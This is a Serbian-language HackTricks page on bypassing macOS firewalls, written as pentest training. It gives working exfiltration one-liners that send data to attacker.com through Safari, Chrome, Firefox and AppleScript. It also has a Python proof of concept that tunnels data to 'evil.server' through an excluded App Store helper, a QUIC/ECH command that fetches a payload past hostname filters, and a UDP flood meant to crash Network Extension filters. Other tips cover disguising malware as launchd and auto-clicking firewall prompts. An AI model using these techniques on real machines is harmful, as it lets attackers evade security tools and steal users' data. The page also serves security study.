# Zaobilaženje firewall-ova na macOS-u

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su se pokazale funkcionalnim u nekim macOS firewall aplikacijama.

### Zloupotreba imena sa whitelist-e

- Na primer, nazovite malware imenima dobro poznatih macOS procesa, kao što je **`launchd`**

### Synthetic Click

- Ako firewall zatraži dozvolu od korisnika, neka malware **klikne na allow**

### **Korišćenje Apple potpisanih binarnih datoteka**

- Kao što je **`curl`**, ali i drugih, poput **`whois`**

### Dobro poznati Apple domeni

Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima, kao što su **`apple.com`** ili **`icloud.com`**. iCloud bi mogao da se koristi kao C2.

### Generičko zaobilaženje

Neke ideje za pokušaj zaobilaženja firewall-ova

### Provera dozvoljenog saobraćaja

Poznavanje dozvoljenog saobraćaja pomoći će vam da identifikujete potencijalno dozvoljene domene ili aplikacije kojima je dozvoljen pristup tim domenima.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

DNS rezolucije se obavljaju putem **`mdnsreponder`** potpisane aplikacije kojoj će verovatno biti dozvoljeno da kontaktira DNS servere.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Putem Browser aplikacija

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem ubacivanja koda u procese

Ako možete da **ubacite kod u proces** kojem je dozvoljeno da se poveže sa bilo kojim serverom, možete zaobići zaštitu firewall-a:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Nedavne ranjivosti za zaobilaženje macOS firewall-a (2023-2025)

### Zaobilaženje Web content filter-a (Screen Time) – **CVE-2024-44206**
U julu 2024. Apple je zakrpio kritičnu grešku u Safari/WebKit-u koja je onemogućavala pravilan rad sistemskog „Web content filter-a“, koji koriste roditeljske kontrole Screen Time-a.
Posebno oblikovan URI (na primer, sa dvostruko URL-enkodiranim „://“) Screen Time ACL ne prepoznaje, ali ga WebKit prihvata, pa se zahtev šalje bez filtriranja. Zato svaki proces koji može da otvori URL (uključujući sandboxed ili nepotpisan kod) može da pristupi domenima koje je korisnik ili MDM profil izričito blokirao.<sup>[2]</sup>

Praktični test (nezakrpljen sistem):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Greška u redosledu pravila Packet Filter-a (PF) u ranoj verziji macOS 14 „Sonoma“
Tokom beta ciklusa za macOS 14, Apple je uveo regresiju u userspace wrapper-u oko **`pfctl`**.
Pravila dodata pomoću ključne reči `quick` (koju koriste mnogi VPN kill-switch-evi) bila su neprimetno ignorisana, što je izazivalo leak saobraćaja čak i kada je VPN/firewall GUI prikazivao *blocked*. Grešku je potvrdilo nekoliko VPN dobavljača, a ispravljena je u RC 2 (build 23A344).

Brza provera leak-a:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Zloupotreba helper servisa potpisanih od strane Apple-a (legacy – pre macOS 11.2)
Pre macOS 11.2, **`ContentFilterExclusionList`** je omogućavao da oko 50 Apple binarnih fajlova, kao što su **`nsurlsessiond`** i App Store, zaobiđu sve socket-filter firewall-e implementirane pomoću Network Extension framework-a (LuLu, Little Snitch itd.).
Malware je jednostavno mogao da pokrene isključeni proces — ili da ubaci kod u njega — i tuneluje sopstveni saobraćaj preko već dozvoljenog socket-a. Apple je potpuno uklonio listu izuzetaka u macOS 11.2, ali je ova tehnika i dalje relevantna na sistemima koji ne mogu da se nadograde.<sup>[3]</sup>

Primer proof-of-concept-a (pre 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za zaobilaženje Network Extension filtera domena (macOS 12+)
NEFilter Packet/Data Providers se oslanjaju na SNI/ALPN iz TLS ClientHello poruke. Uz **HTTP/3 preko QUIC-a (UDP/443)** i **Encrypted Client Hello (ECH)**, SNI ostaje šifrovan, NetExt ne može da parsira tok, a pravila zasnovana na hostname-u često podrazumevano dozvoljavaju saobraćaj, omogućavajući malware-u da pristupi blokiranim domenima bez korišćenja DNS-a.<sup>[5]</sup>

Minimalni PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ako je QUIC/ECH i dalje omogućen, ovo je jednostavan način za zaobilaženje hostname-filtera.

### Nestabilnost Network Extension-a u macOS-u 15 „Sequoia“ (2024–2025)
Rane verzije 15.0/15.1 izazivaju pad third-party **Network Extension** filtera (LuLu, Little Snitch, Defender, SentinelOne itd.). Kada se filter ponovo pokrene, macOS odbacuje svoja flow pravila, a mnogi proizvodi prelaze u režim fail-open. Flooding filtera hiljadama kratkih UDP flow-ova (ili forsiranje QUIC/ECH-a) može više puta izazvati pad i ostaviti prostor za C2/exfil, dok GUI i dalje prikazuje da je firewall pokrenut.<sup>[4]</sup>

Brza reprodukcija (bezbedna lab mašina):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Saveti za alate za moderni macOS

1. Pregledajte trenutna PF pravila koja generišu GUI firewall-i:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Izlistajte binarne datoteke koje već imaju *outgoing-network* entitlement (korisno za piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programski registrujte sopstveni Network Extension content filter u Objective-C/Swift-u.
Minimalni rootless PoC koji prosleđuje pakete lokalnom socket-u dostupan je u izvornom kodu projekta **LuLu** autora Patricka Wardlea.

## Reference

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Pravljenje i razbijanje macOS firewall-a](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Bypass Apple web content filter-a omogućava neograničen pristup blokiranom sadržaju (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple uklanja macOS funkciju koja je aplikacijama omogućavala da zaobiđu bezbednost firewall-a - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity proizvodi prestaju da rade nakon macOS Sequoia ažuriranja - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Koristite network protection da sprečite macOS veze ka zlonamernim sajtovima - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
